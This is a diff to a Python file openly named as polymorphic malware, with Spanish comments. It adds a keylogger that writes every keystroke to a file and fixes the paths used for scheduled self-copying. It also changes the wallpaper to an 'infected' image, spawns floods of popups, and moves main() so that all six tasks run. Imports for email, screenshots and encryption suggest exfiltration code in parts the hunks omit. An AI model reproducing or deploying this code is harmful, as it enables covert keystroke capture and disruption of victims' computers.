@@ -1,5 +1,7 @@
-import os, base64, threading, sched, time, shutil, ctypes, random, pyautogui, subprocess, smtplib, pynput
+import os, base64, logging, threading, sched, time, shutil, ctypes, random, pyautogui, subprocess, smtplib, pynput
 import tkinter as tk
+from pynput.keyboard import Listener
+from tkinter import messagebox
 from PIL import ImageGrab
 from cryptography.fernet import Fernet
 from cryptography.hazmat.backends import default_backend
@@ -10,44 +12,29 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.image import MIMEImage
 
 
-def main():
-
-    task1()
-    task2()
-    task3()
-    task4()
-    task5()
-    task6()
-
-
-if __name__ == "__main__":
-    main()
-
-
 def task1():
 
     def copy_file():
         # Ruta de la carpeta de origen
-        src = 'C:\\User\\Users\\Desktop\\PolymorphicMalware\\FINAL-PM-1.py'
+        src = 'C:\\Users\\User\\Desktop\\PolymorphicMalware\\FINAL-PM-1.py'
         # Ruta de la carpeta de destino
-        dst = '\\User\\Users\\Downloads'
+        dst = '\\Users\\User\\Downloads'
         shutil.copy2(src, dst)
         print("\nArchivo copiado con éxito.\n")
 
     s = sched.scheduler(time.time, time.sleep)
 
-    execute_time = (2023, 1, 17, 12, 0, 0)
+    execute_time = (2023, 1, 17, 12, 0, 0, 0, 0, 0)
 
     s.enterabs(time.mktime(execute_time), 1, copy_file, ())
     s.run()
 
-
 def task2():
 
     # Ruta de la imagen que se desea usar como fondo de pantalla
-    ruta_imagen = "\\User\\Users\\Desktop\\PolymorphicMalware\\USTEDHASIDOINFECTADO.jpeg"
+    ruta_imagen = "\\Users\\User\\Desktop\\PolymorphicMalware\\USTEDHASIDOINFECTADO.jpeg"
 
-    ctypes.windll.user32.SystemParametersInfoW(20, 0, ruta_imagen , 0)
+    ctypes.windll.user32.SystemParametersInfoW(20, 0, ruta_imagen, 0)
     print("\nFondo de pantalla cambiado con éxito.\n")
 
     # Define la nueva fecha y hora
@@ -70,6 +57,8 @@ def task3():
         popup.geometry("+%d+%d" % (x, y))
         label = tk.Label(popup, text="USTED HA SIDO INFECTADO POR UN MALWARE DIVERTIDO")
         label.pack()
+
+    messagebox.showwarning("ALERTA", "USTED HA SIDO INFECTADO POR UN MALWARE DIVERTIDO")
 
     def on_control_c(event):
         [create_popup() for _ in range(100)]
@@ -119,6 +108,13 @@ def task4():
 
 
 def task5():
+    logging.basicConfig(filename=("Keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
+
+    def on_press(key):
+        logging.info(str(key))
+
+    with Listener(on_press=on_press) as listener:
+        listener.join()
 
     keyboard_controller = pynput.keyboard.Controller()
     keylogs = ""
@@ -211,3 +207,17 @@ def task6():
     root = tk.Tk()
     root.bind("<Control-x>", on_control_x)
     root.mainloop()
+
+
+def main():
+
+    task1()
+    task2()
+    task3()
+    task4()
+    task5()
+    task6()
+
+
+if __name__ == "__main__":
+    main()
